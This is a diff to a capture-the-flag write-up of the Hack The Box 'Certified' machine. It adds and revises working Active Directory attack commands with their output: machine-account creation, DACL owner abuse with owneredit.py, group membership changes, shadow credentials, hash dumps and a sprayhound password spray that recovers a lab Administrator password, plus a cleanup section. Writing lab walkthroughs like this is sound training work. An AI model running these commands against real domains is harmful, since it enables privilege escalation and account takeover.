@@ -583,6 +583,8 @@ cat ldeep/*_users_all.json | jq 'map(del(.cn,.accountExpires,.badPasswordTime,.b
 ]
 ```
 
+- `ca_operator` has certificate enabled
+
 ![](/assets/obsidian/850e21de55d762fa7bb08cf20df639aa.png)
 
 - Group users by group
@@ -682,11 +684,7 @@ SYSVOL/certified.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Mic
 ```
 
 
-### DACL Abuse - Add user to Management group
-
-![](/assets/obsidian/39bae7c2cd865118c1dff09887be0681.png)
-
-![](/assets/obsidian/42db78652e8a07e7fdd338b3006eae0a.png)
+### DACL Abuse - Add controlled user to Management group
 
 We can add workstations to domain
 
@@ -699,7 +697,7 @@ MAQ         10.10.11.41     389    DC01             [*] Getting the MachineAccou
 MAQ         10.10.11.41     389    DC01             MachineAccountQuota: 10
 ```
 
-Add a computer account to abuse **DACL** for more **opsec**-safe
+Add a computer account to abuse **DACL** in a more **opsec-safe** way
 
 ```bash
 ┌──(bravosec㉿fsociety)-[~/htb/Certified]
@@ -709,7 +707,21 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Successfully added machine account Test$ with password GceANlGxCaY7ppwTxeYowXPOFJcqjn3M.
 ```
 
-Grant  `Test$` computer account privilege to add members to `Management` group
+Change the **owner** of `MANAGEMENT` group to `judith.mader`
+
+```bash
+┌──(bravosec㉿fsociety)-[~/htb/Certified]
+└─$ owneredit.py -action write -new-owner 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' "$(pt get domain)"/"$(pt get user)":"$(pt get pass)"
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Current owner information below
+[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512
+[*] - sAMAccountName: Domain Admins
+[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb
+[*] OwnerSid modified successfully!
+```
+
+Grant  `Test$` computer account the privilege to add members to `Management` group
 
 ```bash
 ┌──(bravosec㉿fsociety)-[~/htb/Certified]
@@ -730,12 +742,12 @@ Test$:GceANlGxCaY7ppwTxeYowXPOFJcqjn3M
 ┌──(bravosec㉿fsociety)-[~/htb/Certified]
 └─$ net rpc group addmem "Management" 'Test$' -U "$(pt get domain)"/"$(pt get user)"%"$(pt get pass)" -S "$(pt get ip)"
 
+┌──(bravosec㉿fsociety)-[~/htb/Certified]
+└─$ 
 ```
 
 
 ### DACL Abuse - Shadow Credentials attack
-
-![](/assets/obsidian/48c65adb193efbdd74f082c363a7a1c8.png)
 
 Add shadow credentials for `management_svc`
 
@@ -824,7 +836,7 @@ management_svc:aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584
 
 #### Bloodhound
 
-`MANAGEMENT_SVC` has **GenericAll** rights over `CA_OPERATOR`
+- `MANAGEMENT_SVC` has **GenericAll** rights over `CA_OPERATOR`
 
 ![](/assets/obsidian/c301ad9eda4964e7334e023739c00dc0.png)
 
@@ -1206,4 +1218,48 @@ Test$:aes256-cts-hmac-sha1-96:e8570e2b4a779ddfa620edd317850a2f4b78e45a3ac17d506c
 Test$:aes128-cts-hmac-sha1-96:44fd30a5c4cf5c6e5f3fa2d06db4a42e
 Test$:des-cbc-md5:b0e5e5fe43b5f2a4
 [*] Cleaning up...
+```
+
+```bash
+┌──(bravosec㉿fsociety)-[~/htb/Certified]
+└─$ sprayhound --force -dc "$(pt get ip)" -d "$(pt get domain)" -lu "$(pt get user)" -lp "$(pt get pass)" -p 'sh4rQoa0USkwJBLV'
+[+] Login successful
+[+] Successfully retrieved password policy (Threshold: 0)
+[+] Successfully retrieved 9 users
+[+] 9 users will be tested
+[+] 0 users will not be tested
+[+] [  VALID  ] Administrator : sh4rQoa0USkwJBLV
+[+] 1 user has been owned !
+
+┌──(bravosec㉿fsociety)-[~/htb/Certified]
+└─$ pt set user 'Administrator'; pt set pass 'sh4rQoa0USkwJBLV'; echo "$(pt get user):$(pt get pass)" | anew creds.lst
+Administrator:sh4rQoa0USkwJBLV
+```
+
+
+## House cleaning
+
+> The house-cleaning portion of the assessment ensures that remnants of the penetration test are removed. Often times, fragments of tools or user accounts are left on an organization’s computer, which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is paramount importance.
+{: .prompt-info }
+
+Restore the ownership of `MANAGEMENT` group back to `Domain Admins`
+
+```bash
+┌──(bravosec㉿fsociety)-[~/htb/Certified]
+└─$ owneredit.py -action write -new-owner 'Domain Admins' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' "$(pt get domain)"/"$(pt get user)":"$(pt get pass)"
+[*] Current owner information below
+[*] - SID: S-1-5-21-729746778-2675978091-3820388244-1103
+[*] - sAMAccountName: judith.mader
+[*] - distinguishedName: CN=Judith Mader,CN=Users,DC=certified,DC=htb
+[*] OwnerSid modified successfully!
+```
+
+Remove the computer account for shadow credentials attack
+
+```bash
+┌──(bravosec㉿fsociety)-[~/htb/Certified]
+└─$ addcomputer.py -computer-name 'Test' -dc-host "$(pt get dc_fqdn)" "$(pt get domain)"/"$(pt get user)":"$(pt get pass)" -delete
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Successfully deleted Test$.
 ```
